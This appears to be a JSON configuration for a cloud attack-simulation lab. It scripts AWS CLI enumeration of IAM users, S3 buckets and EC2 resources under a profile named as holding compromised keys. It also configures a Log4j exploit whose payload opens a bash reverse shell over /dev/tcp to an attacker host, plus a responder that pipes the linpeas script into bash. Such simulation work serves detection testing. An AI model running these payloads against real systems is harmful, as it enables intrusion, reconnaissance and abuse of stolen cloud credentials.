{
  "context" :  {
    "global": {
      "environment"          : "${ environment }",
      "deployment"           : "${ deployment }"
    },
    "aws" :  {
      "enabled" : true,
      "ssm" :  {
        "target": {
          "execute": {
            "generate_aws_cli_traffic": {
              "enabled": true,
              "compromised_keys_user" : "khon.traktour-${deployment}@interlacelabs",
              "profile" : "aws-traffic",
              "commands": [
                "if ! command -v jq; then curl -LJ -o /usr/bin/jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 /usr/bin/jq; fi",
                "PROFILE=aws-traffic",
                "log \"User: $(aws sts get-caller-identity --profile=$PROFILE)\"",
                "log \"Current IP: $(curl -s http://icanhazip.com)\"",
                "x=10",
                "opts=\"--output json --color off --no-cli-pager\"",
                "while [ $x -gt 0 ];",
                "do",
                  "log \"Running: aws sts get-caller-identity $opt\"",
                  "aws sts get-caller-identity $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws iam list-users $opts\"",
                  "aws iam list-users $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws s3api list-buckets $opts\"",
                  "aws s3api list-buckets $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws ec2 describe-instances $opts\"",
                  "aws ec2 describe-instances $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws ec2 describe-images --filters 'Name=name,Values=ubuntu-pro-server/images/*20.04*' $opts\"",
                  "aws ec2 describe-images --filters 'Name=name,Values=ubuntu-pro-server/images/*20.04*' $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws ec2 describe-volumes $opts\"",
                  "aws ec2 describe-volumes $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws ec2 describe-vpcs $opts\"",
                  "aws ec2 describe-vpcs $opts >> $LOGFILE 2>&1",
                  "x=$(($x-1))",
                "done",
                "log \"Done.\""
              ]
            }
          }
        },
        "attacker": {
          "execute": {
            "docker_exploit_log4j_app": {
              "enabled": true,
              "attacker_http_port": 8088,
              "attacker_ldap_port": 1389,
              "attacker_ip": "log4jc-attacker-${ deployment }.${ attacker_dynu_dns_domain }",
              "target_port": 8080,
              "payload": "/bin/bash -c \"TASK=ransomware /bin/bash -i >& /dev/tcp/log4jc-attacker-${ deployment }.${ attacker_dynu_dns_domain }/4444 0>&1\" | tee /tmp/log.txt",
              "attack_delay": 50400,
              "reverse_shell_port": 4444
            }
          },
          "responder": {
            "reverse_shell_multistage": {
              "enabled": true,
              "listen_ip": "0.0.0.0",
              "listen_port": "4444",
              "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files | tee /tmp/linpeas.txt",
              "attack_delay": 50400,
              "reverse_shell_host" : "log4jc-attacker-${ deployment }.${ attacker_dynu_dns_domain }"
            }
          }
        }
      }
    }
  }
}